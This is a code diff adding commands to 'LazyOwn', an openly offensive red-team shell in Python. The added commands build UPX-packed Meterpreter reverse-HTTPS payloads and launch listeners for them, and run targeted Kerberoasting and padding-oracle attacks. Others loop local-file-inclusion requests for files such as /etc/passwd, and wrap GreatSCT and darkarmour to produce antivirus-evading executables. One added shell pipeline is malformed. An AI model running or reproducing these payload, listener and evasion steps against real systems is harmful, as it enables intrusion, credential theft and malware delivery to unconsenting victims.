@@ -124,6 +124,7 @@ class LazyOwnShell(cmd2.Cmd):
         "ipy": "sh ipython3",
         "loot": "sh ls /home/$USER/.msf4/loot/ && cp /home/$USER/.msf4/loot/* ./sessions/ -r",
         "ls": "list",
+        "lsof": "sh sudo lsof -i -P -n | grep LISTEN",
         "moo": "sh cowthink -bdgpstwy LazyOwn RedTeam Framework. The best OpSec T00l",
         "kvpn":"sh sudo killall openvpn",
         "nmap": "run lazynmap",
@@ -594,7 +595,34 @@ class LazyOwnShell(cmd2.Cmd):
             return
         os.system(f"{path}/modules/lazynmap.sh -t {target_ip}")
         return
+    
+    def do_batchnmap(self, line):
+        """
+        Runs the internal module `modules/lazynmap.sh` for multiple Nmap scans.
 
+        This method executes the `lazynmap` script, using the current working directory
+        and the `rhost` parameter from the `self.params` dictionary as the target IP.
+        If `rhost` is not set, it prints an error message.
+
+        :return: None
+        """
+        
+        file_path = get_users_dic('txt')
+        path = os.getcwd()
+        try:
+            with open(file_path, 'r') as file:
+                for target in file:
+                    target = target.strip()
+                    if target:
+                        os.system(f"{path}/modules/lazynmap.sh -t {target}")
+        except FileNotFoundError:
+            self.perror(f"File not found: {file_path}")
+        except Exception as e:
+            self.perror(f"An error occurred: {e}")
+
+        
+        return
+    
     def run_lazywerkzeugdebug(self):
         """
         Run the internal module located at `modules/lazywerkzeug.py` in debug mode.
@@ -4656,8 +4684,13 @@ class LazyOwnShell(cmd2.Cmd):
                 "wordlist must be assign and you need pass the hash in argument ex: hashcat hash"
             )
             return
-        print_msg(f"Try hashcat -a 0 -m {line} {wordlist}")
-        os.system(f"hashcat -a 0 -m {line} {wordlist}")
+        choice = input("    [?] Do you wanna use this rule /usr/share/hashcat/rules/best64.rule (y/n): ") or 'n'
+        if choice == 'n':
+            print_msg(f"Try hashcat -a 0 -m {line} {wordlist}")
+            os.system(f"hashcat -a 0 -m {line} {wordlist}")
+        else:
+            print_msg(f"Try hashcat -a 0 -m {line} {wordlist} -r /usr/share/hashcat/rules/best64.rule ")
+            os.system(f"hashcat -a 0 -m {line} {wordlist} -r /usr/share/hashcat/rules/best64.rule ")
         return
 
     def complete_hashcat(self, text, line, begidx, endidx):
@@ -5425,6 +5458,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN User accounts", "net user"),
             ("WIN Show computers", "net view"),
             ("WIN ARP Table", "arp -a"),
+            ("WIN Reg Query Uninstall", "cmd /c REG QUERY HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
             ("WIN Enum AV folder protected","& \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -Scan -ScanType 3 -File \"C:\\folder_to_check\|*\""),
             ("WIN Force Install", "Set __COMPAT_LAYER=RunAsInvoker ; Start Shell64.exe"),
             ("WIN IP Configuration", "ipconfig /all"),
@@ -12784,7 +12818,7 @@ class LazyOwnShell(cmd2.Cmd):
 
             if choice == '1':
                 binary_url = "https://github.com/ropnop/go-windapsearch/releases/download/v0.3.0/windapsearch-linux-amd64"
-                binary_path = "~/bin/go-windapsearch"
+                binary_path = "/home/$USER/bin/go-windapsearch"
 
                 if not os.path.exists(os.path.dirname(binary_path)):
                     os.makedirs(os.path.dirname(binary_path))
@@ -12795,7 +12829,7 @@ class LazyOwnShell(cmd2.Cmd):
             
             elif choice == '2':
                 repo_url = "https://github.com/ropnop/go-windapsearch.git"
-                project_dir = "~/bin/go-windapsearch"
+                project_dir = "/home/$USER/bin/go-windapsearch"
 
                 if not os.path.exists(project_dir):
                     os.makedirs(project_dir)
@@ -14119,6 +14153,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         path = os.getcwd()
         rhost = self.params["rhost"]
+        domain = self.params["domain"]
         log = f"{path}/sessions/username_anarchy_{rhost}.txt"
         command_base = f"{path}/external/.exploit/username_anarchy/username-anarchy"
 
@@ -14197,6 +14232,9 @@ class LazyOwnShell(cmd2.Cmd):
                     return
 
         command += f" > {log}"
+        choice = input("    [!] Do you wanna add the Domain to dict. (y/n) ") or 'n'
+        if choice == 'y':
+            command += f" | | xargs -n 1 echo {domain}\\ | tr -d ' ' > sessions/unames_{domain}.txt"
         print_msg(f"    [!] Generated command: {command}")
         os.system(command)
         return
@@ -18316,19 +18354,513 @@ class LazyOwnShell(cmd2.Cmd):
         handler.sys_version = ''
         handler.error_message_format = 'not found'
 
+        input("    [*] Port 80 needs to be free. Terminate the process listening on port 80. Press Enter to continue.: ")
         httpd = MyServer(('0.0.0.0', 80), handler)
         url = self.params["url"]
         lhost = self.params["lhost"]
         if line:
             url = line.strip()
         try:
-            input("    [*] Port 80 needs to be free. Terminate the process listening on port 80. Press Enter to continue.: ")
             print_msg("Starting HTTP server on port 80")
             activate_server(httpd, url, lhost)
             httpd.serve_forever()
         except KeyboardInterrupt:
             print_error("Shutting down the server.")
         httpd.server_close()
+
+
+    def do_targetedKerberoas(self, line):
+        """
+        Executes the targetedKerberoast tool for extracting Kerberos service tickets.
+
+        This function performs the following actions:
+        1. Verifies the presence of the targetedKerberoast tool; if not installed, it clones the repository and installs dependencies.
+        2. Prompts for parameters such as the domain, username, and other configurations required by targetedKerberoast.
+        3. Executes the targetedKerberoast tool with specified options for obtaining "kerberoastable" hashes.
+
+        Parameters:
+        line (str): Command arguments specifying the user, domain, and options.
+                    Expected format:
+                        - domain user hash or password [optional parameters]
+
+        Returns:
+        None
+        """
+        path = os.getcwd()
+        targetedKerberoast_git = "https://github.com/ShutdownRepo/targetedKerberoast.git"
+        targetedKerberoast_path = os.path.join("external", ".exploit", "targetedKerberoast")
+        targetedKerberoast_path = f"{path}/{targetedKerberoast_path}"
+
+        if not os.path.exists(targetedKerberoast_path):
+            print_warn("targetedKerberoast is not installed. Cloning and installing dependencies.")
+            os.system(f"git clone {targetedKerberoast_git} {targetedKerberoast_path}")
+            os.system(f"pip3 install -r {targetedKerberoast_path}/requirements.txt")
+            print_msg("Installation completed.")
+
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
+        username = input("    [!] Enter the target username (default: administrator): ").strip() or "administrator"
+        dc_ip = input(f"    [!] Enter the Domain Controller IP for {domain} (e.g., {rhost}): ").strip() or rhost
+        output_file = input(f"    [!] Enter the output filename for hashes (default: sessions/{rhost}_kerberoast_hashes.txt): ").strip() or f"sessions/{rhost}_kerberoast_hashes.txt"
+        auth_choice = input("    [!] Authenticate using password or hash (default: password): ").strip().lower() or "password"
+        if auth_choice == "password":
+
+            credentials = get_credentials()
+
+            if not credentials:
+                password = input(f"    [!] Enter password for {username}@{domain}: ").strip()
+                auth_param = f"-p '{password}'"
+            else:    
+                for user, password in credentials:
+                    auth_param = f"-p '{password}'"
+        else:
+            hashis = get_hash()
+            auth_param = f"-H '{hashis}'"
+
+        verbosity = input("    [!] Set verbosity level (1 for verbose, 2 for debug, default: quiet): ").strip() or "quiet"
+        verbosity_param = "-q" if verbosity == "quiet" else "-v" * int(verbosity)
+        targetedKerberoast_command = (
+            f"python3 {targetedKerberoast_path}/targetedKerberoast.py -d {domain} -u {username} "
+            f"{auth_param} --dc-ip {dc_ip} -o {output_file} {verbosity_param}"
+        )
+        print_msg(f"Running targetedKerberoast with command: {targetedKerberoast_command}")
+        os.system(targetedKerberoast_command)
+        return
+
+
+    def do_pyoracle2(self, line):
+        """
+        Executes the pyOracle2 tool for performing padding oracle attacks.
+
+        This function performs the following actions:
+        1. Verifies the presence of the pyOracle2 tool; if not installed, it clones the repository and installs dependencies.
+        2. Prompts the user for configuration parameters or retrieves them from self.params to create a job-specific configuration file.
+        3. Executes the pyOracle2 tool using the generated configuration file and specified options.
+
+        Parameters:
+        line (str): Command arguments specifying additional tool options if required.
+                    Expected format: [optional parameters]
+
+        Returns:
+        None
+        """
+        path = os.getcwd()
+        pyoracle_git = "https://github.com/liquidsec/pyOracle2.git"
+        pyoracle_path = os.path.join("external", ".exploit", "pyOracle2")
+        pyoracle_path = f"{path}/{pyoracle_path}"
+
+        if not os.path.exists(pyoracle_path):
+            print_warn("pyOracle2 is not installed. Cloning and installing dependencies.")
+            os.system(f"git clone {pyoracle_git} {pyoracle_path}")
+            os.system(f"pip3 install -r {pyoracle_path}/requirements.txt")
+            print_msg("Installation completed.")
+
+        target_url = self.params["url"]
+        rhost = self.params["rhost"]
+        lhost = self.params["lhost"]
+        domain = self.params["domain"]
+        subdomain = self.params["subdomain"]
+        proxy_enabled = self.params.get("proxy_enabled", True)
+        proxy_ip = self.params.get("proxy_ip", "127.0.0.1")
+        proxy_port = self.params.get("proxy_port", "8080")
+        input_data = input("Enter the Input data: ")
+        mode = input("Enter the mode decrypt/encrypt: ") or 'decrypt'
+        restore_file = self.params.get("restore", None)
+        debug = self.params.get("debug", False)
+
+        config_content = f"""
+        [default]
+
+        name = PyOracle Job
+        URL = {target_url}
+        httpMethod = GET
+        postFormat = x-www-form-urlencoded
+        inputMode = cookie
+        encodingMode = base64
+        vulnerableParameter = auth
+        additionalParameters = {{}}
+        blocksize = 8
+        httpProxyOn = {str(proxy_enabled).lower()}
+        httpProxyIp = {proxy_ip}
+        httpProxyPort = {proxy_port}
+        headers = {{"User-Agent":"Mozilla/5.0","Content-Type":"application/json"}}
+        cookies = {{}}
+        ivMode = firstblock
+        oracleMode = negative
+        oracleText = Invalid padding
+        """.replace("        ",'')
+
+        config_path = os.path.join(pyoracle_path, "pyoracle_config.ini")
+        with open(config_path, "w") as config_file:
+            config_file.write(config_content)
+
+        pyoracle_command = f"python3 {pyoracle_path}/pyOracle2.py -c {config_path}"
+        if restore_file:
+            pyoracle_command += f" -r {restore_file}"
+        if input_data:
+            pyoracle_command += f" -i {input_data}"
+        if mode:
+            pyoracle_command += f" -m {mode}"
+        if debug:
+            pyoracle_command += " -d"
+
+        print_msg(f"Running pyOracle2 with command: {pyoracle_command}")
+        os.system(pyoracle_command)
+        return
+
+    def do_paranoid_meterpreter(self, line):
+        """
+        Creates and deploys a paranoid Meterpreter payload and listener with SSL/TLS pinning and UUID tracking.
+
+        This function performs the following actions:
+        1. Generates a self-signed SSL/TLS certificate for payload encryption.
+        2. Creates either staged or stageless Meterpreter payloads with UUID tracking and TLS pinning.
+        3. Configures and launches a Metasploit listener for the payload.
+
+        Parameters:
+        line (str): Command arguments specifying target configurations.
+                    Expected format:
+                        - rhost lhost domain subdomain
+
+        Returns:
+        None
+        """
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        domain = self.params["domain"]
+        subdomain = self.params["subdomain"]
+        
+        cert_name = f"sessions/{subdomain}.{domain}"
+        print_msg(f"Creating SSL certificate for {cert_name}")
+        cert_command = (
+            f"openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 "
+            f"-subj '/C=US/ST=Texas/L=Austin/O=Development/CN={subdomain}.{domain}' "
+            f"-keyout {cert_name}.key -out {cert_name}.crt && "
+            f"cat {cert_name}.key {cert_name}.crt > {cert_name}.pem && "
+            f"rm -f {cert_name}.key {cert_name}.crt"
+        )
+        print_msg(cert_command)
+        os.system(cert_command)
+        if not line:
+            choice = input("Would you like a staged or stageless payload? (Enter 'staged' or 'stageless'): ").strip().lower()
+        else:
+            choice = line.strip()
+
+        if choice == 'staged':
+            staged_payload_command = (
+                f"msfvenom -p windows/meterpreter/reverse_winhttps LHOST={lhost} LPORT={lport} "
+                f"PayloadUUIDTracking=true HandlerSSLCert=./{cert_name}.pem "
+                f"StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH "
+                f"-f exe -o sessions/launch-paranoid.exe && upx sessions/launch-paranoid.exe"
+            )
+            print_msg(f"Generating staged Meterpreter payload for {lhost}")
+            print_msg(staged_payload_command)
+            os.system(staged_payload_command)
+
+            listener_staged_command = (
+                f"msfconsole -q -x 'use exploit/multi/handler; "
+                f"set PAYLOAD windows/meterpreter/reverse_winhttps; "
+                f"set LHOST {lhost}; set LPORT {lport}; set HandlerSSLCert ./{cert_name}.pem; "
+                f"set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'"
+            )
+            print_msg("Starting Metasploit listener for staged payload")
+            print_msg(listener_staged_command)
+            os.system(listener_staged_command)
+
+        elif choice == 'stageless':
+            stageless_payload_command = (
+                f"msfvenom -p windows/meterpreter_reverse_https LHOST={lhost} LPORT={lport} "
+                f"PayloadUUIDTracking=true HandlerSSLCert=./{cert_name}.pem "
+                f"StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless "
+                f"-f exe -o sessions/launch-paranoid-stageless.exe && upx sessions/launch-paranoid-stageless.exe"
+            )
+            print_msg(f"Generating stageless Meterpreter payload for {lhost}")
+            print_msg(stageless_payload_command)
+            os.system(stageless_payload_command)
+
+            listener_stageless_command = (
+                f"msfconsole -q -x 'use exploit/multi/handler; "
+                f"set PAYLOAD windows/meterpreter_reverse_https; "
+                f"set LHOST {lhost}; set LPORT {lport}; set HandlerSSLCert ./{cert_name}.pem; "
+                f"set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'"
+            )
+            print_msg("Starting Metasploit listener for stageless payload")
+            print_msg(listener_stageless_command)
+            os.system(listener_stageless_command)
+
+        else:
+            print_msg("Invalid choice. Please enter 'staged' or 'stageless'.")
+            return
+
+        print_msg("Paranoid Meterpreter payload and listener created successfully.")
+        return
+    
+    def do_lfi(self, line):
+        """
+        Exploits a potential Local File Inclusion (LFI) vulnerability by crafting 
+        and sending HTTP GET requests to a specified URL.
+
+        The user can specify the target URL directly via the `line` parameter or 
+        provide it interactively. If no URL is provided, the method uses a default 
+        value stored in `self.params["url"]`. Users are then prompted to specify 
+        the file to retrieve from the server, defaulting to `/etc/passwd`.
+
+        Args:
+            line (str): Optional URL input provided directly in the command line. 
+                        If not supplied, a default URL from `self.params["url"]` 
+                        will be used.
+
+        Behavior:
+            - Continuously prompts the user to specify a file to fetch via the 
+            target LFI vulnerability.
+            - Sends a GET request to the constructed URL and prints the server's 
+            response to the console.
+            - Allows users to inspect different files on the target server by 
+            modifying the file path interactively.
+        """
+        url = self.params["url"]
+        if line:
+            url = line.strip()
+
+        url = input(f"    [!] Enter url (default {url}): ") or url
+        start = f"{YELLOW}    [*] Start Lazy Lfi Scanning...\n {RESET}"
+        for s in start:
+            sys.stdout.write(s)
+            sys.stdout.flush()
+            time.sleep(0.1)    
+
+        while True:
+            file = input(f"   [!] Enter file (default /etc/passwd): ") or '/etc/passwd'
+            url = f"{url}{file}"
+            print_msg(url)
+            r = requests.get(url)
+            print_msg(r.text)
+        
+    def do_greatSCT(self, line):
+        """
+        Executes the GreatSCT tool for generating payloads that bypass antivirus and application whitelisting solutions.
+
+        This function performs the following actions:
+        1. Verifies the presence of the GreatSCT tool; if not installed, it clones the repository and installs dependencies.
+        2. Configures and generates the payload using user-provided or default parameters.
+        3. Executes the GreatSCT tool with the specified options.
+
+        Parameters:
+        line (str): Command arguments specifying additional tool options if required.
+                    Expected format: [--ip <IP> --port <PORT> --tool <TOOL> --payload <PAYLOAD>]
+
+        Returns:
+        None
+        """
+        path = os.getcwd()
+        greatsct_git = "https://github.com/GreatSCT/GreatSCT.git"
+        greatsct_path = os.path.join("external", ".exploit", "GreatSCT")
+        greatsct_path = f"{path}/{greatsct_path}"
+
+        if not os.path.exists(greatsct_path):
+            print_warn("GreatSCT is not installed. Cloning and setting up dependencies.")
+            os.system(f"git clone {greatsct_git} {greatsct_path}")
+            os.system(f"cd {greatsct_path}/setup && sudo ./setup.sh -c")
+            print_msg("GreatSCT installation completed.")
+
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        tool = "Bypass"
+        payload = "installutil/powershell/script.py"
+        obfuscation = "ascii"
+        script_path = f"{path}/sessions/script.ps1"
+
+        greatsct_command = (
+            f"python3 {greatsct_path}/GreatSCT.py --ip {lhost} --port {lport} "
+            f"-t {tool} -p {payload} -c \"OBFUSCATION={obfuscation} SCRIPT={script_path}\""
+        )
+
+        print_msg(f"Running GreatSCT with command: {greatsct_command}")
+        os.system(greatsct_command)
+        return
+
+
+    def do_sqsh(self, line):
+        """
+        Executes the Impacket sqsh tool for manipulating ownership of Active Directory objects.
+
+        This function performs the following actions:
+        1. Prompts the user for necessary parameters if not provided.
+        2. Executes the command to change the owner of a specified target in Active Directory.
+
+        The command accepts the following parameters:
+        - New owner (user) for the target object.
+        - Target object to be manipulated.
+        - Domain credentials for authentication.
+        - DC IP address for the domain controller.
+
+        Parameters:
+        line (str): Command argument specifying the new owner and target options.
+                    Expected format:
+                        - -new-owner NEW_OWNER for the new owner
+                        - -target TARGET_OBJECT for the target object
+                        - Required flags for authentication and connection
+
+        Returns:
+        None
+        """
+        rhost = self.params["rhost"]
+        domain = self.params["domain"]
+        
+        credentials_path = f"{os.getcwd()}/sessions/credentials.txt"
+
+        if not os.path.exists(credentials_path):
+            print_error("Need credentials to use this option. Use: createcredentials admin:admin")
+            return
+
+        credentials = get_credentials()
+        if not credentials:
+            return
+
+        for user, passwd in credentials:
+            command = f"sqsh -S {rhost} -U {user} -P {passwd}"
+            print_msg(command)
+            os.system(command)
+        return
+
+
+    def do_setoolKits(self, line):
+        """
+        Executes the SEToolKit workflow to generate a Meterpreter payload 
+        and configure the multi-handler using LHOST and LPORT from self.params.
+
+        Usage:
+            do_setoolKits
+
+        Arguments:
+            None: LHOST and LPORT are retrieved from self.params.
+
+        Workflow:
+            1. Launches SEToolKit.
+            2. Navigates to option 1 (Social-Engineering Attacks).
+            3. Selects option 9 (Powershell Alphanumeric Shellcode Injector).
+            4. Configures LHOST and LPORT using values from self.params.
+            5. Generates a Meterpreter reverse HTTPS payload.
+            6. Configures a multi-handler to listen for incoming connections.
+        """
+        try:
+            lhost = self.params["lhost"]
+            lport = self.params["lport"]
+
+            if not lhost or not lport:
+                raise ValueError("LHOST and LPORT must be specified in self.params")
+
+            print_msg(f"[*] SEToolKit configuring payload with LHOST={lhost} and LPORT={lport}.")
+            os.system("sudo setoolkit -q")
+        except Exception as e:
+            print_error(f"[!] Error: {e}")
+
+    def do_jwt_tool(self, line):
+        """
+        Uses the jwt_tool to analyze, tamper, or exploit JSON Web Tokens (JWTs).
+
+        This function performs the following actions:
+        1. Verifies the presence of jwt_tool; if not installed, it clones the repository and installs dependencies.
+        2. Accepts a JWT token as input or uses the provided argument for analysis.
+        3. Executes jwt_tool with the specified options and prints the results.
+
+        Parameters:
+        line (str): Command argument containing a JWT token to analyze. If not provided, prompts the user for a token.
+
+        Returns:
+        None
+        """
+        path = os.getcwd()
+        jwt_tool_git = "https://github.com/ticarpi/jwt_tool.git"
+        jwt_tool_path = os.path.join("external", ".exploit", "jwt_tool")
+        jwt_tool_path = f"{path}/{jwt_tool_path}"
+
+        if not os.path.exists(jwt_tool_path):
+            print_warn("jwt_tool is not installed. Cloning the repository and installing dependencies.")
+            os.system(f"git clone {jwt_tool_git} {jwt_tool_path}")
+            os.system(f"python3 -m pip install -r {jwt_tool_path}/requirements.txt")
+            print_msg("jwt_tool installation completed.")
+
+        jwt_token = line.strip() if line else input("Enter the JWT token: ").strip()
+        
+        jwt_tool_command = f"python3 {jwt_tool_path}/jwt_tool.py {jwt_token}"
+
+        print_msg(f"Running jwt_tool with command: {jwt_tool_command}")
+        os.system(jwt_tool_command)
+        choice = input("    [?] Do you want try add another cookie (you must 'intercept on' in burp suit)? (y/n)") or 'n'
+        if choice == 'y':
+            rhost = self.params["rhost"]
+            jwt_tool_command = f"python3 {jwt_tool_path}/jwt_tool.py -t http://{rhost}/ -rc \"jwt={jwt_token};anothercookie=grisun0\" -M pb"
+            print_msg(f"Running jwt_tool with command: {jwt_tool_command}")
+            os.system(jwt_tool_command)
+        return
+
+
+    def do_darkarmour(self, line):
+        """
+        Uses the darkarmour tool to generate an undetectable version of a PE executable.
+
+        This function performs the following actions:
+        1. Verifies the presence of darkarmour; if not installed, it clones the repository and installs dependencies.
+        2. Prompts the user for various options to customize the tool's behavior.
+        3. Constructs a command to run darkarmour with the selected options.
+        4. Executes darkarmour to generate the output file with the desired level of obfuscation.
+
+        Parameters:
+        line (str): Command line arguments for the tool.
+
+        Returns:
+        None
+        """
+        path = os.getcwd()
+        sessions = f"{path}/sessions"
+        darkarmour_git = "https://github.com/bats3c/darkarmour.git"
+        darkarmour_path = os.path.join("external", ".exploit", "darkarmour")
+        darkarmour_path = f"{path}/{darkarmour_path}"
+
+        if not os.path.exists(darkarmour_path):
+            print_warn("darkarmour is not installed. Cloning the repository and installing dependencies.")
+            os.system(f"git clone {darkarmour_git} {darkarmour_path}")
+            os.system(f"sudo apt install mingw-w64-tools mingw-w64-common g++-mingw-w64 gcc-mingw-w64 upx-ucl osslsigncode")
+            print_msg("darkarmour installation completed.")
+
+
+        file_input = input(f"    [!] Enter file to encrypt (default: 'sessions/shell64.exe'): ") or f"{sessions}/shell64.exe"
+        encryption_method = input(f"    [!] Enter encryption method (default: 'xor'): ") or "xor"
+        shellcode_file = input(f"    [!] Enter shellcode file (default: None): ") or None
+        is_binary = input(f"    [!] Is the file a binary executable (default: 'yes')? (y/n): ") or "y"
+        use_dll = input(f"    [!] Use reflective DLL injection (default: 'no')? (y/n): ") or "n"
+        pack_upx = input(f"    [!] Pack the executable with UPX (default: 'yes')? (y/n): ") or "y"
+        use_jmp = input(f"    [!] Use JMP-based PE loader (default: 'yes')? (y/n): ") or "y"
+        use_runpe = input(f"    [!] Use RUNPE to load PE (default: 'no')? (y/n): ") or "n"
+        is_source = input(f"    [!] Is the file C source code (default: 'no')? (y/n): ") or "n"
+        encryption_key = input(f"    [!] Enter encryption key (default: None): ") or None
+        loop_count = input(f"    [!] Enter number of encryption levels (default: '5'): ") or "5"
+        output_file = input(f"    [!] Enter output file name (default: 'sessions/legit.exe'): ") or f"{sessions}/legit.exe"
+
+        darkarmour_command = f"cd {darkarmour_path} && python3 {darkarmour_path}/darkarmour.py -f {file_input} --encrypt {encryption_method} "
+        
+        if shellcode_file:
+            darkarmour_command += f"--shellcode {shellcode_file} "
+        if is_binary.lower() == "y":
+            darkarmour_command += "--binary "
+        if use_dll.lower() == "y":
+            darkarmour_command += "--dll "
+        if pack_upx.lower() == "y":
+            darkarmour_command += "--upx "
+        if use_jmp.lower() == "y":
+            darkarmour_command += "--jmp "
+        if use_runpe.lower() == "y":
+            darkarmour_command += "--runpe "
+        if is_source.lower() == "y":
+            darkarmour_command += "--source "
+        if encryption_key:
+            darkarmour_command += f"--key {encryption_key} "
+        darkarmour_command += f"--loop {loop_count} -o {output_file}"
+
+        print_msg(f"Running darkarmour with command: {darkarmour_command}")
+        os.system(darkarmour_command)
+        return
 
 if __name__ == "__main__":
     p = LazyOwnShell()
